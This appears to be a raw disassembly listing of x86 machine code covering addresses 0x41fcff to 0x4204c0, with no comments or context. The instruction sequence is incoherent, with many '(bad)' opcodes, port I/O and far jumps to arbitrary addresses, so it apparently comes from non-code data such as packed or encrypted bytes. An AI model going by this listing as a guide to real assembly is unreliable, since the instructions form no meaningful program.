  41fcff:	and    esp,esp
  41fd01:	add    BYTE PTR [edx+0x1a],ah
  41fd04:	mov    eax,ds:0xf6b388b3
  41fd09:	out    0x84,eax
  41fd0b:	out    0x21,al
  41fd0d:	retf   
  41fd0e:	adc    dl,BYTE PTR ds:0xc47f7503
  41fd14:	js     0x41fce9
  41fd16:	xchg   ebx,eax
  41fd17:	jge    0x41fc9a
  41fd19:	dec    bh
  41fd1b:	je     0x41fd23
  41fd1d:	int    0x63
  41fd1f:	iret   
  41fd20:	fs jnp 0x41fcd7
  41fd23:	call   0xd10b:0x52e4985e
  41fd2a:	xor    bl,0xcc
  41fd2d:	js     0x41fd12
  41fd2f:	loopne 0x41fd55
  41fd31:	sub    al,BYTE PTR [edx]
  41fd33:	fs cs xchg edx,eax
  41fd36:	mov    cl,0xed
  41fd38:	jecxz  0x41fcd4
  41fd3a:	shl    BYTE PTR [ecx-0x6924a953],0x6e
  41fd41:	pop    edx
  41fd42:	out    dx,al
  41fd43:	stc    
  41fd44:	or     eax,0xed755078
  41fd49:	adc    eax,0xf4147541
  41fd4e:	test   DWORD PTR [ebx+eax*1],0xe58e32a6
  41fd55:	dec    esi
  41fd56:	sbb    esi,DWORD PTR [esi-0xd]
  41fd59:	mov    al,0x4b
  41fd5b:	dec    ebx
  41fd5c:	inc    esp
  41fd5d:	adc    BYTE PTR [edi],ch
  41fd5f:	push   0x511d0bce
  41fd64:	dec    ebp
  41fd65:	mov    ds,edi
  41fd67:	inc    ebp
  41fd68:	or     esi,0xffffffda
  41fd6b:	ins    BYTE PTR es:[edi],dx
  41fd6c:	add    DWORD PTR [edx+0x54766643],ebx
  41fd72:	lock int 0x49
  41fd75:	mov    bh,0x76
  41fd77:	fisttp QWORD PTR [ecx+0x215b2d1]
  41fd7d:	mov    dl,0x65
  41fd7f:	mov    al,ds:0x2d07a9cf
  41fd84:	mov    ebp,0xe3db797c
  41fd89:	mov    DWORD PTR [edi],edi
  41fd8b:	mov    esp,0xb29dbd6b
  41fd90:	jbe    0x41fd3d
  41fd92:	sahf   
  41fd93:	push   es
  41fd94:	arpl   cx,cx
  41fd96:	nop    edx
  41fd99:	ror    BYTE PTR [edi+eiz*4+0x236f1fc2],cl
  41fda0:	and    al,0x46
  41fda2:	sub    esi,DWORD PTR es:[edx]
  41fda5:	pop    edx
  41fda6:	loope  0x41fe05
  41fda8:	in     al,0x4c
  41fdaa:	jle    0x41fdca
  41fdac:	jno    0x41fdeb
  41fdae:	xchg   ebp,eax
  41fdaf:	stos   BYTE PTR es:[edi],al
  41fdb0:	mov    edx,DWORD PTR [esi+ebp*8]
  41fdb3:	popa   
  41fdb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdb5:	aaa    
  41fdb6:	sub    eax,0x75ea60d7
  41fdbb:	jg     0x41fe2e
  41fdbd:	jns    0x41fd5b
  41fdbf:	addr16 dec edx
  41fdc1:	fadd   QWORD PTR [edi-0x617676c8]
  41fdc7:	in     eax,dx
  41fdc8:	push   ebx
  41fdc9:	push   0xfffffff0
  41fdcb:	(bad)  
  41fdcc:	push   ss
  41fdcd:	mov    dl,BYTE PTR [esi]
  41fdcf:	mov    edx,0x80c98ef6
  41fdd4:	jle    0x41fe0e
  41fdd6:	add    al,0xc2
  41fdd8:	les    esp,FWORD PTR [ebx]
  41fdda:	add    al,0x8e
  41fddc:	dec    ax
  41fdde:	mov    cs,WORD PTR [ebx+0x1]
  41fde1:	retf   0x11e2
  41fde4:	mov    DWORD PTR [ebp-0x120bfe94],eax
  41fdea:	sbb    BYTE PTR [ebp-0x6ffd23fa],dl
  41fdf0:	(bad)  
  41fdf1:	repnz mov DWORD PTR [esp+ebp*1+0x7],esi
  41fdf6:	xchg   ecx,eax
  41fdf7:	(bad)  
  41fdf8:	sbb    eax,0xb55eceb8
  41fdfd:	in     eax,dx
  41fdfe:	and    al,0xdc
  41fe00:	or     edx,eax
  41fe02:	add    BYTE PTR [edi],bh
  41fe04:	pusha  
  41fe05:	pop    edi
  41fe06:	mov    ebx,DWORD PTR [ebx+0x5]
  41fe09:	shl    DWORD PTR [eax+ebp*4],1
  41fe0c:	in     al,dx
  41fe0d:	push   ds
  41fe0e:	add    eax,0x29a74121
  41fe13:	add    DWORD PTR [edi+0x27],ebp
  41fe16:	xor    BYTE PTR [esi],al
  41fe18:	fidivr DWORD PTR [edi]
  41fe1a:	add    eax,0x65cf3365
  41fe1f:	cli    
  41fe20:	aaa    
  41fe21:	sbb    BYTE PTR [edx+0x5a72afc9],0x1d
  41fe28:	jnp    0x41fe31
  41fe2a:	jecxz  0x41fdea
  41fe2c:	adc    al,0x7b
  41fe2e:	inc    esp
  41fe2f:	jl     0x41fdd5
  41fe31:	and    DWORD PTR [edi-0x783b92de],0x8241811c
  41fe3b:	lods   al,BYTE PTR ds:[esi]
  41fe3c:	adc    eax,DWORD PTR [edi]
  41fe3e:	add    DWORD PTR [esi-0x1e2474d7],eax
  41fe44:	sti    
  41fe45:	or     ebp,DWORD PTR [ebp+0x3a311dd1]
  41fe4b:	jno    0x41fea9
  41fe4d:	push   ds
  41fe4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe4f:	mov    ebx,0x4b1c1769
  41fe54:	cmp    DWORD PTR [ecx-0x4e],eax
  41fe57:	repnz test eax,0xf4ce34e4
  41fe5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe5e:	and    ah,al
  41fe60:	shl    DWORD PTR [edi-0xae8e84e],cl
  41fe66:	test   eax,0x4563fcd0
  41fe6b:	loope  0x41fe14
  41fe6d:	push   edx
  41fe6e:	jecxz  0x41fe15
  41fe70:	pop    edi
  41fe71:	arpl   WORD PTR [edx+eax*8-0x4a],bx
  41fe75:	xchg   ecx,eax
  41fe76:	push   ebx
  41fe77:	je     0x41fec6
  41fe79:	das    
  41fe7a:	lock aas 
  41fe7c:	mov    al,0x2e
  41fe7e:	jbe    0x41fe1c
  41fe80:	bound  eax,QWORD PTR [eax]
  41fe82:	adc    eax,0x77eeedaa
  41fe87:	mov    dl,0x23
  41fe89:	call   0x61f1:0x215870c1
  41fe90:	ins    BYTE PTR es:[edi],dx
  41fe91:	ret    
  41fe92:	or     al,0xfc
  41fe94:	imul   esp,DWORD PTR [esi],0xc11411d2
  41fe9a:	jno    0x41fe99
  41fe9c:	sbb    ecx,0x80852085
  41fea2:	and    eax,0x511adbeb
  41fea7:	sbb    bl,BYTE PTR [ecx-0x28b35751]
  41fead:	cmovge ebx,edi
  41feb0:	jmp    0xcf6d:0x424065c8
  41feb7:	and    dh,BYTE PTR [esi-0x6]
  41feba:	xchg   ebx,eax
  41febc:	cdq    
  41febd:	cmp    eax,0xe8d26849
  41fec2:	adc    ebx,DWORD PTR [edx]
  41fec4:	aad    0xf1
  41fec6:	aas    
  41fec7:	mov    ch,dh
  41fec9:	fcomp  DWORD PTR [ecx]
  41fecb:	xchg   esp,eax
  41fecc:	ja     0x41feb2
  41fece:	cld    
  41fecf:	loopne 0x41ff06
  41fed1:	and    DWORD PTR [eax],ecx
  41fed3:	into   
  41fed4:	enter  0xfe49,0x16
  41fed8:	xor    ch,ah
  41feda:	jne    0x41ff43
  41fedc:	xchg   edx,eax
  41fedd:	adc    eax,0xa0bff1a8
  41fee2:	add    bl,BYTE PTR [esi]
  41fee4:	jns    0x41fecd
  41fee6:	stc    
  41fee7:	neg    DWORD PTR [ebx]
  41fee9:	(bad)  
  41feea:	mov    esi,0x67638d84
  41feef:	loope  0x41fee8
  41fef1:	mov    ecx,0x94b6981a
  41fef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fef7:	into   
  41fef8:	test   BYTE PTR [ecx+0x65],bl
  41fefb:	fs dec edi
  41fefd:	mov    ds:0x65bb1f42,al
  41ff02:	jmp    0x41ff2f
  41ff04:	aas    
  41ff05:	fild   QWORD PTR [ebx-0x6f0fa1dd]
  41ff0b:	popf   
  41ff0c:	adc    cl,BYTE PTR ds:0xda2311b8
  41ff12:	icebp  
  41ff13:	xor    BYTE PTR [eax],al
  41ff15:	mov    bl,0x8f
  41ff17:	add    ebx,DWORD PTR [esi+0x50]
  41ff1a:	test   DWORD PTR [ebp+0x46],ebp
  41ff1d:	ja     0x41ff6d
  41ff1f:	xchg   esp,eax
  41ff20:	retf   
  41ff21:	jne    0x41fef3
  41ff23:	mov    ch,0x3f
  41ff25:	sbb    al,0xae
  41ff27:	mov    DWORD PTR [edi-0x6f],ebp
  41ff2a:	mov    ds,WORD PTR [ebp+0x35]
  41ff2d:	lods   al,BYTE PTR ds:[esi]
  41ff2e:	xor    edi,ecx
  41ff30:	xlat   BYTE PTR ds:[ebx]
  41ff31:	fdiv   DWORD PTR ds:0x77dc215
  41ff37:	(bad)  
  41ff38:	into   
  41ff39:	jmp    0x41ff35
  41ff3b:	xchg   ebp,eax
  41ff3c:	push   ss
  41ff3d:	push   edi
  41ff3e:	cld    
  41ff3f:	push   eax
  41ff40:	neg    BYTE PTR [edx+eax*2]
  41ff43:	push   ds
  41ff44:	push   es
  41ff45:	les    ecx,FWORD PTR [eax]
  41ff47:	repz mov ecx,0x345e9867
  41ff4d:	pop    edi
  41ff4e:	mov    bl,0x96
  41ff50:	enter  0x9232,0x34
  41ff54:	adc    BYTE PTR [ebp-0x5a1246c6],0xab
  41ff5b:	into   
  41ff5c:	inc    eax
  41ff5d:	push   es
  41ff5e:	sub    BYTE PTR [ebp+0x41],ah
  41ff61:	iret   
  41ff62:	mov    bl,0xc6
  41ff64:	dec    eax
  41ff65:	xchg   esp,eax
  41ff66:	mov    esi,0xf376fefd
  41ff6b:	test   BYTE PTR [ebx+0x4d],bh
  41ff6e:	test   al,0x96
  41ff70:	scas   eax,DWORD PTR es:[edi]
  41ff71:	jns    0x41ffd9
  41ff73:	add    eax,0xf794fc5f
  41ff78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff79:	out    dx,al
  41ff7a:	mov    ah,0xa
  41ff7c:	fsubr  DWORD PTR [esp+ebp*1+0x2]
  41ff80:	xor    DWORD PTR [ecx],edx
  41ff82:	std    
  41ff83:	xchg   edx,eax
  41ff84:	mov    bl,dl
  41ff86:	inc    esi
  41ff87:	and    edi,ecx
  41ff89:	cmp    eax,0xacb92252
  41ff8e:	inc    esi
  41ff8f:	retf   
  41ff90:	sub    BYTE PTR [ebx+0x70],0xde
  41ff94:	mov    ecx,0x8da215a8
  41ff99:	sub    DWORD PTR [ebp+0x4e6b898b],eax
  41ff9f:	adc    al,0x5d
  41ffa1:	test   BYTE PTR [edi-0x73d8ff8d],0x21
  41ffa8:	pop    ecx
  41ffa9:	cld    
  41ffaa:	push   es
  41ffab:	dec    ebp
  41ffac:	jne    0x41ff66
  41ffae:	out    dx,eax
  41ffaf:	and    eax,0x6adf95e8
  41ffb4:	and    edx,DWORD PTR [edi-0x32]
  41ffb7:	(bad)  
  41ffb8:	loopne 0x41ff47
  41ffba:	fs mov bl,0x5
  41ffbd:	adc    dl,dh
  41ffbf:	adc    cl,BYTE PTR [esi]
  41ffc1:	clc    
  41ffc2:	dec    esp
  41ffc3:	xchg   edi,eax
  41ffc4:	jmp    0x7fd2ab16
  41ffc9:	call   0xbac65091
  41ffce:	or     eax,0xff9eaa8d
  41ffd3:	shl    BYTE PTR [ebx-0x5c2cd0c6],0x42
  41ffda:	stos   DWORD PTR es:[edi],eax
  41ffdb:	(bad)
  41ffde:	mov    eax,ds:0xbdecce7f
  41ffe3:	adc    al,BYTE PTR [ebx-0x1c]
  41ffe6:	das    
  41ffe7:	fcom   QWORD PTR [esi]
  41ffe9:	sbb    DWORD PTR [ebx+0x38],esp
  41ffec:	cmp    BYTE PTR [ebx],0xc
  41ffef:	xchg   BYTE PTR [ecx],dl
  41fff1:	scas   eax,DWORD PTR es:[edi]
  41fff2:	ret    
  41fff3:	add    DWORD PTR [ecx],esi
  41fff5:	out    0xd2,al
  41fff7:	stc    
  41fff8:	add    eax,0xaa9dd605
  41fffd:	push   ebp
  41fffe:	and    eax,DWORD PTR [ebx]
  420000:	adc    ebp,DWORD PTR [ecx-0x54]
  420003:	test   BYTE PTR [edi],bh
  420005:	inc    esp
  420006:	dec    ebp
  420007:	fistp  DWORD PTR [ecx+0x36ab5d85]
  42000d:	hlt    
  42000e:	push   ebx
  42000f:	ss mov ah,0x9
  420012:	mul    BYTE PTR [ebx+0x324e562]
  420018:	daa    
  420019:	(bad)  
  42001a:	pop    ebp
  42001b:	ret    
  42001c:	test   al,0xf8
  42001e:	vprotq ymm13,[esi+esi*8-0x48],xmm4
  420025:	nop
  420026:	mov    ecx,0xb7a965c9
  42002b:	jl     0x41fff8
  42002d:	imul   BYTE PTR [edi-0x63]
  420030:	lods   al,BYTE PTR ds:[esi]
  420031:	leave  
  420032:	cmp    al,0xb3
  420034:	mov    ebp,0x17fe95ca
  420039:	sbb    edx,0x5dc0750
  42003f:	aam    0x9b
  420041:	pop    eax
  420042:	out    0x91,eax
  420044:	aad    0xab
  420046:	adc    BYTE PTR [eax+0x15],0x5b
  42004a:	mov    edx,0xdc783436
  42004f:	das    
  420050:	mov    bl,0x7b
  420052:	push   es
  420053:	imul   edx,DWORD PTR [ebx+0x7d006272],0x36
  42005a:	sub    eax,DWORD PTR [edx]
  42005c:	xchg   DWORD PTR [ebp+0x7e],edx
  42005f:	scas   al,BYTE PTR es:[edi]
  420060:	ficom  DWORD PTR [esi-0x54]
  420063:	ret    0xf93e
  420066:	dec    ebx
  420067:	iret   
  420068:	push   ebx
  420069:	in     al,0xb
  42006b:	or     BYTE PTR [esi],cl
  42006d:	dec    esp
  42006e:	sub    DWORD PTR [edi+0x416715cd],ebp
  420074:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420075:	call   0xd501:0x9abd47e5
  42007c:	push   edx
  42007d:	jl     0x4200dd
  42007f:	sbb    esi,ebx
  420081:	pop    edi
  420082:	cmc    
  420083:	mov    ebx,0xb1ac070d
  420088:	cmp    ebx,DWORD PTR [eax-0x7c]
  42008b:	or     al,0x25
  42008d:	add    al,0x7a
  42008f:	(bad)  
  420090:	pusha  
  420091:	daa    
  420092:	stos   BYTE PTR es:[edi],al
  420093:	leave  
  420094:	xor    esi,DWORD PTR [ebp+0x5033a2b1]
  42009a:	addr16 dec edx
  42009c:	and    DWORD PTR [ebp+ecx*2-0x60328d14],0xbd23860
  4200a7:	mov    dl,0x14
  4200a9:	xor    DWORD PTR [edx-0x2e5b32d4],esi
  4200af:	bound  edx,QWORD PTR [esi]
  4200b1:	ficomp DWORD PTR [edx+0x39ad6d2f]
  4200b7:	pusha  
  4200b8:	push   eax
  4200b9:	sbb    al,BYTE PTR [esi+0x17]
  4200bc:	jbe    0x42011a
  4200be:	add    eax,0xd2f628b1
  4200c3:	xchg   esi,eax
  4200c4:	ret    
  4200c5:	js     0x4200d3
  4200c7:	push   esi
  4200c8:	cmc    
  4200c9:	mov    edx,0x74e5780b
  4200ce:	xchg   edi,eax
  4200cf:	shl    DWORD PTR [edi+0x1],1
  4200d2:	xchg   ch,ch
  4200d4:	arpl   di,di
  4200d6:	adc    DWORD PTR [edx+0x31],ecx
  4200d9:	adc    ebx,DWORD PTR [ecx-0x1f601e5c]
  4200df:	mov    cl,0x8b
  4200e1:	repnz mov ah,0x60
  4200e4:	add    al,0x8d
  4200e6:	cmp    al,0xf4
  4200e8:	ss mov ah,0x3d
  4200eb:	pop    esp
  4200ec:	or     bh,BYTE PTR [edi-0x518d0fc4]
  4200f2:	(bad)  
  4200f3:	fnstsw WORD PTR [edi+edx*2]
  4200f6:	cli    
  4200f7:	nop
  4200f8:	mov    eax,ds:0x9c4942d6
  4200fd:	fstp   DWORD PTR [edi-0x2133a1fa]
  420103:	sbb    ebx,DWORD PTR [eax+0x6f]
  420106:	loope  0x420156
  420108:	gs in  eax,0x8a
  42010b:	pop    esi
  42010c:	mov    ch,0x20
  42010e:	jae    0x4200f6
  420110:	jbe    0x4200d2
  420112:	cs out 0xc3,eax
  420115:	mov    bh,0x63
  420117:	fist   WORD PTR [ebp+0x6b214567]
  42011d:	cli    
  42011e:	jb     0x4200b4
  420120:	jne    0x420155
  420122:	cmp    edi,DWORD PTR [ecx]
  420124:	jp     0x4200cb
  420126:	dec    ecx
  420127:	sub    eax,0xfb7ff9f3
  42012c:	or     al,cl
  42012e:	imul   esp,DWORD PTR [ebp+0x46849b22],0x58
  420135:	arpl   cx,ax
  420137:	rcl    BYTE PTR ds:0xd9207a7d,1
  42013d:	and    DWORD PTR [edx+eax*2+0x20],0x8d3a9f4f
  420145:	lds    esi,FWORD PTR [ecx+0x7c6c42da]
  42014b:	mov    BYTE PTR [ecx],bh
  42014d:	mov    ds:0xcefdc721,al
  420152:	xor    BYTE PTR [ecx],0xc0
  420155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420157:	lahf   
  420158:	push   edi
  420159:	inc    esp
  42015a:	stc    
  42015b:	out    dx,eax
  42015c:	mov    al,dh
  42015e:	call   0xf29b:0x87764a5c
  420165:	cwde   
  420166:	mov    ds:0xdb72c461,eax
  42016b:	xchg   edx,eax
  42016c:	mov    esi,0x92a59c65
  420171:	mov    al,0x97
  420173:	aas    
  420174:	loope  0x42016e
  420176:	sub    BYTE PTR [ecx+0x32401082],dh
  42017c:	dec    edx
  42017d:	js     0x420152
  42017f:	scas   al,BYTE PTR es:[edi]
  420180:	mov    dh,0xf1
  420182:	pop    ss
  420183:	fist   DWORD PTR [edx+esi*4-0x651f2516]
  42018a:	fist   WORD PTR [esi+0x8]
  42018d:	aam    0xeb
  42018f:	ds fcos 
  420192:	pop    ss
  420193:	loop   0x420168
  420195:	lds    eax,FWORD PTR [edi-0x3]
  420198:	pusha  
  420199:	push   ebx
  42019b:	mov    al,ds:0xbfe46f86
  4201a0:	push   ebx
  4201a1:	push   edx
  4201a2:	jns    0x42013c
  4201a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201a5:	dec    esp
  4201a6:	je     0x42012c
  4201a8:	lahf   
  4201a9:	stos   DWORD PTR es:[edi],eax
  4201aa:	enter  0xc7b6,0xd2
  4201ae:	fistp  QWORD PTR [ebp+0x30]
  4201b1:	(bad)  
  4201b2:	aas    
  4201b3:	jbe    0x42014d
  4201b5:	adc    esp,0x14c27d70
  4201bb:	adc    BYTE PTR [esi],al
  4201bd:	daa    
  4201be:	lods   al,BYTE PTR ds:[esi]
  4201bf:	cmp    DWORD PTR [ecx],esi
  4201c1:	mov    ebx,0xd21b14c4
  4201c6:	dec    esp
  4201c7:	sub    ebx,ecx
  4201c9:	test   BYTE PTR [ebx],0xcf
  4201cc:	popa   
  4201cd:	cdq    
  4201ce:	popf   
  4201cf:	loope  0x420187
  4201d1:	jnp    0x4201c0
  4201d3:	inc    edx
  4201d4:	aad    0x33
  4201d6:	xchg   esi,eax
  4201d7:	pop    ss
  4201d8:	add    DWORD PTR [edi],edi
  4201da:	mov    cl,0x48
  4201dc:	arpl   WORD PTR [ebx],dx
  4201de:	lods   eax,DWORD PTR ds:[esi]
  4201df:	xchg   edx,eax
  4201e0:	push   edx
  4201e1:	xchg   BYTE PTR [edx+ecx*1],dl
  4201e4:	and    esi,DWORD PTR [ebp-0x23]
  4201e7:	jo     0x42020e
  4201e9:	inc    edx
  4201ea:	or     eax,0x8e567c48
  4201ef:	push   cs
  4201f0:	fild   WORD PTR [ebp+edx*8+0xf]
  4201f4:	add    DWORD PTR [edi-0x3a2b9d1e],esp
  4201fa:	or     eax,0x5a43875
  4201ff:	repnz xchg esp,eax
  420201:	leave  
  420202:	scas   al,BYTE PTR es:[edi]
  420203:	push   es
  420204:	inc    ecx
  420205:	mov    al,0x2e
  420207:	clc    
  420208:	jge    0x420287
  42020a:	push   es
  42020b:	jno    0x4201ce
  42020d:	push   0x10bddb33
  420212:	sti    
  420213:	ficomp DWORD PTR [ebx]
  420215:	mov    bl,0xe3
  420217:	add    al,0x6a
  420219:	lock adc cl,BYTE PTR [ebp+0x20c77af5]
  420220:	pop    es
  420221:	popa   
  420222:	das    
  420223:	fistp  QWORD PTR [edi]
  420225:	adc    al,bl
  420227:	push   edi
  420228:	stos   BYTE PTR es:[edi],al
  420229:	dec    edx
  42022a:	add    BYTE PTR fs:[edx],al
  42022d:	or     al,0x6
  42022f:	pop    ecx
  420230:	pop    edi
  420231:	mov    cl,0x9
  420233:	pop    ds
  420234:	mov    edx,0xbbe6071a
  420239:	inc    esp
  42023a:	mov    cl,0x40
  42023c:	jmp    0x796b:0xb9742407
  420243:	pushf  
  420244:	ror    DWORD PTR [eax+ebx*4-0x4a],cl
  420248:	ds std 
  42024a:	sbb    BYTE PTR [edi+0x579ff77e],ah
  420250:	loope  0x42020b
  420252:	scas   eax,DWORD PTR es:[edi]
  420253:	push   cs
  420254:	mov    ebp,DWORD PTR [ebp*1+0x867f592]
  42025b:	jbe    0x4202bd
  42025d:	mov    cs,WORD PTR [esi-0x5834d209]
  420263:	nop
  420264:	adc    esp,DWORD PTR [ebx+0x2e]
  420267:	stos   DWORD PTR es:[edi],eax
  420268:	push   ebp
  420269:	jge    0x420290
  42026b:	pop    ds
  42026c:	test   BYTE PTR [ebp-0x3801c72f],cl
  420272:	xchg   esi,eax
  420273:	int3   
  420274:	cmp    eax,0xd252ea00
  420279:	xor    eax,0x78
  42027c:	in     eax,0xae
  42027e:	outs   dx,BYTE PTR ds:[esi]
  42027f:	outs   dx,DWORD PTR ds:[esi]
  420280:	ficom  WORD PTR [edx]
  420282:	push   esi
  420283:	mov    bh,0x6f
  420285:	mov    edx,DWORD PTR [edi+0x444fa3ee]
  42028b:	rcl    BYTE PTR [ecx+0x72],cl
  42028e:	lods   eax,DWORD PTR ds:[esi]
  42028f:	sbb    DWORD PTR [ecx+esi*2],eax
  420292:	and    eax,0xa52cd507
  420297:	xchg   ebx,eax
  420299:	mov    ecx,0x78d6aa36
  42029e:	push   ecx
  42029f:	pop    DWORD PTR [ebx-0x59]
  4202a2:	push   edi
  4202a3:	and    eax,0xb5b3b537
  4202a8:	pushf  
  4202a9:	xlat   BYTE PTR ds:[ebx]
  4202aa:	jle    0x4202da
  4202ac:	dec    ebp
  4202ad:	adc    BYTE PTR [ebp+0x12bb79b6],dl
  4202b3:	(bad)  
  4202b4:	jno    0x4202f4
  4202b6:	and    DWORD PTR [eax],0x15066c7e
  4202bc:	adc    al,0x3
  4202be:	nop
  4202bf:	pop    ecx
  4202c0:	lea    ebp,[eax]
  4202c2:	and    al,0x43
  4202c4:	repz shl BYTE PTR [ebx],cl
  4202c7:	(bad)
  4202cb:	push   0xf345c344
  4202d0:	dec    esi
  4202d1:	iret   
  4202d2:	loop   0x4202b5
  4202d4:	and    eax,0x5b47e4f5
  4202d9:	aas    
  4202da:	jnp    0x4202a2
  4202dc:	imul   ecx,DWORD PTR ds:0x4ef3ad8e,0xffffffaf
  4202e3:	out    0xe4,al
  4202e5:	leave  
  4202e6:	ret    0x39f9
  4202e9:	fnstsw WORD PTR [edi+0x72457b4e]
  4202ef:	scas   al,BYTE PTR es:[edi]
  4202f0:	lods   eax,DWORD PTR ds:[esi]
  4202f1:	inc    edx
  4202f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202f3:	fst    QWORD PTR [ebp+0x21]
  4202f6:	jg     0x42027c
  4202f8:	or     al,0xb3
  4202fa:	xchg   edi,eax
  4202fb:	adc    eax,0xe52ee05
  420300:	popa   
  420301:	inc    ebx
  420302:	out    0x7a,al
  420304:	fst    QWORD PTR [edi+0x6e431e16]
  42030a:	ficomp DWORD PTR [ecx]
  42030c:	sub    eax,0xc5860e24
  420311:	test   BYTE PTR [eax+0x30],bl
  420314:	mov    esp,0x791ca0b3
  420319:	cdq    
  42031a:	imul   edx,DWORD PTR [edx-0x564bce95],0xae56917c
  420324:	dec    esp
  420325:	or     ax,0x7cd5
  420329:	test   eax,0x139e12ca
  42032e:	loopne 0x420326
  420330:	cs aad 0xd4
  420333:	retf   
  420334:	sbb    al,0x8a
  420336:	ins    BYTE PTR es:[edi],dx
  420337:	push   ecx
  420338:	call   0xa55e6f72
  42033d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42033e:	jmp    0xd4a:0x8bb6cff9
  420345:	test   eax,0xe5036315
  42034a:	cmp    eax,0x8fdc61d0
  42034f:	neg    DWORD PTR gs:[esi+esi*2]
  420353:	inc    esp
  420354:	mov    ebx,0x7d9bea0b
  420359:	aad    0xf8
  42035b:	test   DWORD PTR [eax],esi
  42035d:	and    BYTE PTR [esi],bl
  42035f:	fnsave [ebp+eiz*1+0x405eb7db]
  420366:	dec    esp
  420367:	adc    eax,0xc7507b53
  42036c:	syscall 
  42036e:	xor    ecx,esp
  420370:	dec    esi
  420371:	inc    edx
  420372:	prefetcht2 BYTE PTR [ecx]
  420375:	cmp    ebp,DWORD PTR [edx]
  420377:	push   ecx
  420378:	push   ebp
  420379:	xchg   ebp,eax
  42037a:	ds pop ebx
  42037c:	jmp    0x4403:0x90bb6b92
  420383:	pop    ecx
  420384:	mov    dh,0x1f
  420386:	and    al,0x15
  420388:	pop    edx
  420389:	cmp    BYTE PTR [eax-0x1b],bl
  42038c:	push   esi
  42038d:	and    DWORD PTR [edx+eax*4+0x7e521d56],0x37
  420395:	sbb    esi,DWORD PTR [eax+0x50]
  420398:	lock stc 
  42039a:	ins    BYTE PTR es:[edi],dx
  42039b:	inc    eax
  42039c:	scas   al,BYTE PTR es:[edi]
  42039d:	mov    ebp,0x24833531
  4203a2:	sar    ah,0x72
  4203a5:	cmp    eax,0xad5c353
  4203aa:	(bad)  
  4203ab:	dec    esi
  4203ac:	stos   WORD PTR es:[edi],ax
  4203ae:	mov    bl,0x1c
  4203b0:	and    DWORD PTR [edx],esp
  4203b2:	outs   dx,DWORD PTR gs:[esi]
  4203b4:	or     eax,0xed4d046e
  4203b9:	rcr    DWORD PTR [esi-0x9ec7f7f],0x5c
  4203c0:	(bad)  
  4203c1:	fistp  DWORD PTR [edi]
  4203c3:	add    ah,BYTE PTR [ebp-0x1f]
  4203c6:	cmp    BYTE PTR [ebp-0x7],0x66
  4203ca:	aam    0xaf
  4203cc:	push   ecx
  4203cd:	adc    ebp,DWORD PTR [esi]
  4203cf:	(bad)  
  4203d0:	cmp    dh,BYTE PTR [ecx+ecx*4]
  4203d3:	outs   dx,BYTE PTR ds:[esi]
  4203d4:	mov    al,ds:0xa4ecf609
  4203d9:	pop    ss
  4203da:	fdivr  DWORD PTR [eax+0x16]
  4203dd:	fisttp WORD PTR [ebp+0x6529ad6a]
  4203e3:	imul   esp,esp,0x793d851f
  4203e9:	jmp    0xda28a057
  4203ee:	cld    
  4203ef:	out    dx,eax
  4203f0:	xchg   esi,eax
  4203f1:	int3   
  4203f2:	les    ecx,FWORD PTR [eax-0x253c670d]
  4203f8:	daa    
  4203f9:	add    ah,BYTE PTR [ebx]
  4203fb:	adc    al,0xf8
  4203fd:	mov    edx,0xb73c9817
  420402:	adc    ch,BYTE PTR gs:[esi]
  420405:	jne    0x42041a
  420407:	sar    BYTE PTR [esi+0x7dfc7618],1
  42040d:	repnz add eax,0x949a8eec
  420413:	fldpi  
  420415:	pop    ss
  420416:	sbb    esp,ebp
  420418:	bound  ebp,QWORD PTR [edi]
  42041a:	pop    ebp
  42041b:	adc    eax,0xcdc9f2ec
  420420:	shr    DWORD PTR [edi-0x7145fcd5],cl
  420426:	sub    edi,DWORD PTR [ebp+edx*2+0x683798fc]
  42042d:	fbld   TBYTE PTR [ebx]
  42042f:	gs retf 
  420431:	jmp    0x3ca4047c
  420436:	dec    ecx
  420437:	mov    ch,dl
  420439:	jbe    0x42048e
  42043b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42043c:	mov    fs,ecx
  42043e:	sub    ch,bl
  420440:	add    bl,BYTE PTR [esi]
  420442:	jno    0x420494
  420444:	enter  0x3570,0x2f
  420448:	inc    edx
  420449:	out    dx,eax
  42044a:	and    BYTE PTR [edx-0xa],cl
  42044d:	cld    
  42044e:	rcr    DWORD PTR [ecx-0x24050ac7],cl
  420454:	or     eax,0xb167643c
  420459:	inc    ebp
  42045a:	clc    
  42045b:	lea    esi,[ebx+0xf]
  42045e:	jo     0x420487
  420460:	sbb    DWORD PTR [ebp-0xa],0xffffff89
  420464:	or     al,0xe1
  420466:	jne    0x420475
  420468:	xor    dh,bl
  42046a:	cmp    BYTE PTR [edx+eax*4-0x1664d1eb],al
  420471:	loope  0x42047c
  420473:	mov    esp,0xa5ef5d42
  420478:	cwde   
  420479:	cmp    al,0x93
  42047b:	outs   dx,BYTE PTR ds:[esi]
  42047c:	push   cs
  42047d:	push   ebp
  42047e:	mov    al,0x86
  420480:	jae    0x4204c5
  420482:	fdiv   st,st(1)
  420484:	xchg   ecx,eax
  420485:	pop    edx
  420486:	sub    DWORD PTR [edi+0x59b1ccf7],0xffffffa0
  42048d:	mov    ecx,0x5aee89f9
  420492:	xchg   ebp,eax
  420493:	add    DWORD PTR [esp+ebp*1],ecx
  420496:	push   esp
  420497:	xchg   esi,eax
  420498:	sub    eax,0x86c464c2
  42049d:	enter  0xcbef,0x39
  4204a1:	push   ss
  4204a2:	mov    ebx,0xe94f1c3f
  4204a7:	sbb    bh,bl
  4204a9:	dec    ecx
  4204aa:	mov    ebx,0xdf65677c
  4204af:	cmp    ecx,DWORD PTR [eax-0x6f7e70b5]
  4204b5:	mov    ebx,0xacf9a507
  4204ba:	xchg   esp,eax
  4204bb:	xor    eax,0x5b
  4204be:	sub    DWORD PTR [edi],edx
  4204c0:	jmp    0xbcc1:0xe3a8938
